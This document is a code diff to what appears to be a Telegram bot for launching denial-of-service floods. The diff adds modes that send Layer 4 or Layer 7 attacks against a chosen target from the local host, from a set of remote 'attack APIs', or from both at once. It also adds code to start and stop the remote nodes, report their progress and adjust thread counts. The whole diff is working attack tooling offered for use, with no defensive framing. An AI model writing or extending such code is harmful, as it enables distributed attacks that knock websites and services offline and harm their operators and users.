@@ -263,6 +263,8 @@ class AttackSession:
     monitor_task: Optional[asyncio.Task] = None
     error_count: int = 0  # Track errors during attack
     last_error: str = ""  # Last error message
+    attack_mode: str = "local"  # "local", "api", or "all"
+    api_attack_ids: Dict[str, str] = field(default_factory=dict)  # api_name -> attack_id
 
 
 @dataclass
@@ -1163,8 +1165,29 @@ Select an option from the menu below to begin.
                 session.is_running = False
                 if session.monitor_task and not session.monitor_task.done():
                     session.monitor_task.cancel()
+                
+                # Stop API attacks if any
+                api_stop_results = []
+                if session.api_attack_ids:
+                    for api_name, attack_id in session.api_attack_ids.items():
+                        for api in self.attack_apis:
+                            if api.name == api_name:
+                                success, msg = stop_api_attack(api, attack_id)
+                                api_stop_results.append((api_name, success))
+                                break
+                
                 del self.active_sessions[user_id]
-                await update.message.reply_text("🛑 Attack stopped.", reply_markup=self.get_main_menu_keyboard())
+                
+                # Build stop message
+                stop_msg = "🛑 Attack stopped."
+                if api_stop_results:
+                    api_details = []
+                    for api_name, success in api_stop_results:
+                        status = "✅" if success else "⚠️"
+                        api_details.append(f"{status} {api_name}")
+                    stop_msg += f"\n\n📊 API Status:\n" + "\n".join(api_details)
+                
+                await update.message.reply_text(stop_msg, reply_markup=self.get_main_menu_keyboard())
             else:
                 await update.message.reply_text("📭 No active attacks to stop.", reply_markup=self.get_main_menu_keyboard())
         except Exception as e:
@@ -1550,16 +1573,37 @@ Step 1/3: Enter a name for this API (e.g., "server1"):
                     if session.last_error:
                         error_info += f"\n📛 Last: {session.last_error[:50]}"
                 
+                # Attack mode info
+                mode_desc = {"local": "🖥️ Local", "api": "🌐 API", "all": "🔀 Local + API"}
+                mode_info = mode_desc.get(session.attack_mode, session.attack_mode)
+                
+                # API attack status
+                api_status = ""
+                if session.api_attack_ids:
+                    api_status = "\n\n🌐 API Attacks:"
+                    for api_name, attack_id in session.api_attack_ids.items():
+                        for api in self.attack_apis:
+                            if api.name == api_name:
+                                status_info = get_api_attack_status(api, attack_id)
+                                if status_info.get("success"):
+                                    api_data = status_info.get("status", {})
+                                    api_progress = api_data.get("progress", 0)
+                                    api_status += f"\n• {api_name}: {api_progress}%"
+                                else:
+                                    api_status += f"\n• {api_name}: ⚠️ Status unavailable"
+                                break
+                
                 status_text = f"""
 📊 Attack Status:
 -----------------
 🎯 Target: {session.config.target}
 ⚡ Method: {session.config.method}
+🎮 Mode: {mode_info}
 ⏱️ Elapsed: {elapsed}s
 ⏳ Remaining: {remaining}s
 📈 Progress: [{progress_bar}] {progress}%
 📤 PPS: {Tools.humanformat(int(REQUESTS_SENT))}
-📦 BPS: {Tools.humanbytes(int(BYTES_SEND))}{error_info}
+📦 BPS: {Tools.humanbytes(int(BYTES_SEND))}{error_info}{api_status}
 """
                 await self.safe_edit_message(
                     query,
@@ -1738,7 +1782,33 @@ Use inline buttons to navigate and configure attacks.
                 )
                 return ConversationState.MAIN_MENU.value
             
-            await self.start_attack(query, user_id, config)
+            # Check if there are enabled APIs
+            enabled_apis = self.get_enabled_apis()
+            if enabled_apis:
+                # Show attack mode selection
+                await self.safe_edit_message(
+                    query,
+                    self.format_config_summary(config) + "\n\n🎯 Select attack mode:",
+                    reply_markup=self.get_attack_mode_keyboard()
+                )
+                return ConversationState.SELECT_ATTACK_MODE.value
+            else:
+                # No APIs configured, start local attack directly
+                await self.start_attack(query, user_id, config, attack_mode="local")
+                return ConversationState.MAIN_MENU.value
+        
+        # Attack mode selection handlers (combined for DRY)
+        elif data in ("attack_mode_local", "attack_mode_api", "attack_mode_all"):
+            # Map callback data to attack mode
+            mode_map = {
+                "attack_mode_local": "local",
+                "attack_mode_api": "api",
+                "attack_mode_all": "all"
+            }
+            attack_mode = mode_map[data]
+            
+            # Validation is done in start_attack, just call it
+            await self.start_attack(query, user_id, config, attack_mode=attack_mode)
             return ConversationState.MAIN_MENU.value
         
         elif data == "confirm_cancel":
@@ -1758,10 +1828,31 @@ Use inline buttons to navigate and configure attacks.
                 session.is_running = False
                 if session.monitor_task and not session.monitor_task.done():
                     session.monitor_task.cancel()
+                
+                # Stop API attacks if any
+                api_stop_results = []
+                if session.api_attack_ids:
+                    for api_name, attack_id in session.api_attack_ids.items():
+                        for api in self.attack_apis:
+                            if api.name == api_name:
+                                success, msg = stop_api_attack(api, attack_id)
+                                api_stop_results.append((api_name, success))
+                                break
+                
                 del self.active_sessions[user_id]
+                
+                # Build stop message
+                stop_msg = "🛑 Attack stopped."
+                if api_stop_results:
+                    api_details = []
+                    for api_name, success in api_stop_results:
+                        status = "✅" if success else "⚠️"
+                        api_details.append(f"{status} {api_name}")
+                    stop_msg += f"\n\n📊 API Status:\n" + "\n".join(api_details)
+                
                 await self.safe_edit_message(
                     query,
-                    "🛑 Attack stopped.\n\n🏠 Main Menu:",
+                    stop_msg + "\n\n🏠 Main Menu:",
                     reply_markup=self.get_main_menu_keyboard()
                 )
             else:
@@ -2318,7 +2409,7 @@ Step 3/3: Enter API key (or type 'none' for no key):
                 reply_markup=self.get_tools_keyboard()
             )
     
-    async def start_attack(self, query, user_id: int, config: AttackConfig) -> None:
+    async def start_attack(self, query, user_id: int, config: AttackConfig, attack_mode: str = "local") -> None:
         """Start the attack with given configuration."""
         # Validate configuration
         is_valid, error_msg = config.validate()
@@ -2337,13 +2428,21 @@ Step 3/3: Enter API key (or type 'none' for no key):
             old_session.is_running = False
             if old_session.monitor_task and not old_session.monitor_task.done():
                 old_session.monitor_task.cancel()
+            # Stop API attacks if any
+            if old_session.api_attack_ids:
+                for api_name, attack_id in old_session.api_attack_ids.items():
+                    for api in self.attack_apis:
+                        if api.name == api_name:
+                            stop_api_attack(api, attack_id)
+                            break
         
         event = Event()
         
         session = AttackSession(
             config=config.copy(),
             event=event,
-            start_time=time()
+            start_time=time(),
+            attack_mode=attack_mode
         )
         
         self.active_sessions[user_id] = session
@@ -2355,13 +2454,52 @@ Step 3/3: Enter API key (or type 'none' for no key):
         try:
             await self.safe_edit_message(query, "🚀 Starting attack... Please wait.")
             
-            if config.is_layer7:
-                await self._start_layer7_attack(query, session)
-            else:
-                await self._start_layer4_attack(query, session)
+            # Determine what to start based on attack mode
+            api_results = []
+            local_started = False
+            
+            if attack_mode in ("api", "all"):
+                # Start API attacks
+                api_results = await self._start_api_attacks(session, config)
+            
+            if attack_mode in ("local", "all"):
+                # Start local attack
+                if config.is_layer7:
+                    await self._start_layer7_attack(query, session)
+                else:
+                    await self._start_layer4_attack(query, session)
+                local_started = True
+            
+            # Build result message
+            result_parts = []
+            
+            if local_started:
+                result_parts.append(f"🖥️ Local: Started with {len(session.threads)} threads")
+            
+            for api_name, success, msg in api_results:
+                status = "✅" if success else "❌"
+                result_parts.append(f"{status} {api_name}: {msg}")
+            
+            if not result_parts:
+                raise BotError("No attacks were started")
             
             # Start monitoring task and store reference for cleanup
             session.monitor_task = asyncio.create_task(self._monitor_attack(query, user_id, session))
+            
+            # Show success message
+            mode_desc = {"local": "🖥️ Local", "api": "🌐 API", "all": "🔀 Local + API"}
+            msg = (
+                f"🚀 Attack Started!\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"🎯 Target: {config.target}\n"
+                f"⚡ Method: {config.method}\n"
+                f"🎮 Mode: {mode_desc.get(attack_mode, attack_mode)}\n"
+                f"⏱️ Duration: {config.duration}s\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"📊 Results:\n" + "\n".join(result_parts) + "\n\n"
+                f"Use 🔄 Refresh Status to see progress."
+            )
+            await self.safe_edit_message(query, msg, reply_markup=self.get_stop_keyboard())
             
         except Exception as e:
             logger.error(f"Attack failed to start: {e}\n{traceback.format_exc()}")
@@ -2374,6 +2512,78 @@ Step 3/3: Enter API key (or type 'none' for no key):
                 f"⚠️ Attack failed to start:\n{str(e)}\n\n🏠 Main Menu:",
                 reply_markup=self.get_main_menu_keyboard()
             )
+    
+    async def _start_api_attacks(self, session: AttackSession, config: AttackConfig) -> List[Tuple[str, bool, str]]:
+        """
+        Start attacks on all enabled APIs simultaneously.
+        
+        Returns:
+            List of (api_name, success, message) tuples
+        """
+        enabled_apis = self.get_enabled_apis()
+        if not enabled_apis:
+            return []
+        
+        # First, check health of all APIs and get their max_threads
+        api_health_info = {}
+        healthy_apis = []
+        
+        for api in enabled_apis:
+            is_healthy, health_info = check_api_health(api)
+            if is_healthy:
+                api.is_healthy = True
+                api.max_threads = health_info.get("max_threads", 0)
+                api_health_info[api.name] = health_info
+                healthy_apis.append(api)
+            else:
+                api.is_healthy = False
+                logger.warning(f"API {api.name} is unhealthy: {health_info.get('error', 'Unknown')}")
+        
+        if not healthy_apis:
+            return [(api.name, False, "Unhealthy") for api in enabled_apis]
+        
+        # Calculate minimum max_threads across all healthy APIs
+        # Get list of positive max_threads values
+        api_max_threads = [api.max_threads for api in healthy_apis if api.max_threads > 0]
+        
+        # Use minimum from APIs if available, otherwise use config threads
+        if api_max_threads:
+            min_max_threads = min(api_max_threads)
+            adjusted_threads = min(config.threads, min_max_threads)
+        else:
+            adjusted_threads = config.threads
+        
+        if adjusted_threads < config.threads:
+            logger.info(f"Adjusted threads from {config.threads} to {adjusted_threads} due to API limits")
+        
+        # Prepare attack config for APIs
+        # Use the target as-is if it already has a scheme, otherwise add http://
+        target_url = config.target if config.target.startswith("http") else f"http://{config.target}"
+        
+        api_config = {
+            "method": config.method,
+            "target": target_url,
+            "port": config.port,
+            "threads": adjusted_threads,
+            "duration": config.duration,
+            "rpc": config.rpc,
+            "is_layer7": config.is_layer7,
+        }
+        
+        # Start attacks on all healthy APIs
+        results = []
+        for api in healthy_apis:
+            success, message, attack_id = start_api_attack(api, api_config.copy())
+            if success and attack_id:
+                session.api_attack_ids[api.name] = attack_id
+            results.append((api.name, success, message if success else f"Failed: {message}"))
+        
+        # Add unhealthy APIs to results
+        for api in enabled_apis:
+            if api not in healthy_apis:
+                results.append((api.name, False, "Unhealthy - skipped"))
+        
+        return results
     
     async def _start_layer7_attack(self, query, session: AttackSession) -> None:
         """Start Layer 7 attack."""
